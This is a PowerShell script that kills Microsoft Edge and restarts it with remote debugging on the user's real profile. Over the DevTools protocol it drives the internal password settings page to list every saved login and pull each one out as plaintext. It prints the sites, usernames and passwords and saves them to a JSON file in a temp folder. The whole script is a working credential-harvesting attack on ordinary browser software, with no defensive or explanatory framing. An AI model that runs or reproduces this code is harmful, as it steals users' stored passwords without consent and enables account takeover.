$ErrorActionPreference = 'SilentlyContinue'

# ═══ 1. Kill Edge ═══
taskkill /F /IM msedge.exe /T 2>$null
Start-Sleep 3

# ═══ 2. Start Edge with debug ═══
$edgeExe = (Get-ChildItem "C:\Program Files*\Microsoft\Edge\Application\msedge.exe" -EA SilentlyContinue | Select-Object -First 1).FullName
$proc = Start-Process -FilePath $edgeExe -ArgumentList @('--remote-debugging-port=9222', '--user-data-dir=C:\Users\admin\AppData\Local\Microsoft\Edge\User Data') -PassThru
Write-Output "edge pid: $($proc.Id)"
Start-Sleep 15

# ═══ 3. Verify CDP ═══
$ver = curl.exe -s http://127.0.0.1:9222/json/version 2>$null
if (-not $ver) { Write-Output "CDP not up"; exit }
Write-Output "CDP: OK"

# ═══ 4. Navigate existing page to settings/passwords ═══
$targets = (curl.exe -s http://127.0.0.1:9222/json/list | ConvertFrom-Json)
$page = $targets | Where-Object { $_.type -eq 'page' } | Select-Object -First 1
Write-Output "page: $($page.url) ws=$($page.webSocketDebuggerUrl)"

# ═══ 5. Connect and navigate ═══
$ws = New-Object System.Net.WebSockets.ClientWebSocket
$ct = [System.Threading.CancellationToken]::None
$ws.ConnectAsync([Uri]$page.webSocketDebuggerUrl, $ct).Wait()

$buf = [byte[]]::new(10485760)
$script:mid = 0

function SendRecv {
    param([hashtable]$msg)
    $script:mid++
    $msg.id = $script:mid
    $j = ConvertTo-Json -Compress -InputObject $msg -Depth 5
    $b = [System.Text.Encoding]::UTF8.GetBytes($j)
    $s = [ArraySegment[byte]]::new($b)
    $ws.SendAsync($s, 'Text', $true, $ct).Wait()
    $s2 = [ArraySegment[byte]]::new($buf)
    $r = $ws.ReceiveAsync($s2, $ct).Result
    return [System.Text.Encoding]::UTF8.GetString($buf, 0, $r.Count)
}

# Enable Page domain first
$null = SendRecv @{ method = "Page.enable" }

# Navigate
$navResp = SendRecv @{ method = "Page.navigate"; params = @{ url = "edge://settings/passwords" } }
Write-Output "nav: $($navResp.Substring(0, [Math]::Min(150, $navResp.Length)))"

# Wait for page to fully load
Start-Sleep 20

# Enable Runtime (NEW context after navigation)
$null = SendRecv @{ method = "Runtime.enable" }
Start-Sleep 3

# ═══ 6. Evaluate ═══
Write-Output "=== evaluating ==="

# Check URL
$r = SendRecv @{ method = "Runtime.evaluate"; params = @{ expression = 'location.href'; returnByValue = $true } }
$rObj = $r | ConvertFrom-Json
Write-Output "URL: $($rObj.result.result.value)"

# Check API
$r = SendRecv @{ method = "Runtime.evaluate"; params = @{ expression = 'JSON.stringify({pp: !!chrome.passwordsPrivate, methods: chrome.passwordsPrivate ? Object.getOwnPropertyNames(chrome.passwordsPrivate).sort() : []})'; returnByValue = $true } }
$rObj = $r | ConvertFrom-Json
Write-Output "API: $($rObj.result.result.value)"

# Get password list
Write-Output "=== password list ==="
$r = SendRecv @{ method = "Runtime.evaluate"; params = @{
    expression = @'
new Promise((resolve, reject) => {
    chrome.passwordsPrivate.getSavedPasswordList(function(entries) {
        if (chrome.runtime.lastError) {
            reject(chrome.runtime.lastError.message);
        } else {
            resolve(JSON.stringify(entries || []));
        }
    });
})
'@
    awaitPromise = $true; returnByValue = $true
} }
$rObj = $r | ConvertFrom-Json
$listVal = $rObj.result.result.value
Write-Output "list: $listVal"

if ($listVal -and $listVal -ne "null") {
    $passwords = $listVal | ConvertFrom-Json
    Write-Output "[+] $($passwords.Count) passwords"

    # Extract each
    $results = [System.Collections.ArrayList]::new()
    $mid2 = 1000

    foreach ($entry in $passwords) {
        $mid2++
        $eid = $entry.id
        $eurl = if ($entry.urls -and $entry.urls.Count -gt 0) { $entry.urls[0] } else { "?" }
        $euser = $entry.username

        Write-Output "[$($i+1)] $eurl ($euser)..."

        $getMsg = @{
            id = $mid2
            method = "Runtime.evaluate"
            params = @{
                expression = "new Promise(r => chrome.passwordsPrivate.getPlaintextPassword($eid, pw => r(pw)))"
                awaitPromise = $true
                returnByValue = $true
            }
        }
        $getJ = ConvertTo-Json -Compress -InputObject $getMsg -Depth 5
        $getB = [System.Text.Encoding]::UTF8.GetBytes($getJ)
        $getS = [ArraySegment[byte]]::new($getB)
        $ws.SendAsync($getS, 'Text', $true, $ct).Wait()
        $s2 = [ArraySegment[byte]]::new($buf)
        $r2 = $ws.ReceiveAsync($s2, $ct).Result
        $getResp = [System.Text.Encoding]::UTF8.GetString($buf, 0, $r2.Count)
        $getObj = $getResp | ConvertFrom-Json
        $pw = $getObj.result.result.value

        if ($pw) {
            [void]$results.Add([PSCustomObject]@{url=$eurl; user=$euser; pass=$pw})
            Write-Output "    PASSWORD: $pw"
        } else {
            Write-Output "    failed: $($getResp.Substring(0, [Math]::Min(200, $getResp.Length)))"
        }
    }

    Write-Output ""
    Write-Output "=== RESULTS ==="
    foreach ($r2 in $results) {
        Write-Output "$($r2.url) | $($r2.user) | $($r2.pass)"
    }
    $results | ConvertTo-Json -Depth 3 | Out-File C:\Windows\Temp\ziti\pwd_output.json -Encoding utf8
    Write-Output "[+] saved"
} else {
    Write-Output "no passwords"
    # Show raw response for debugging
    Write-Output "raw: $($r.Substring(0, [Math]::Min(500, $r.Length)))"
}

$ws.Dispose()
Write-Output "done"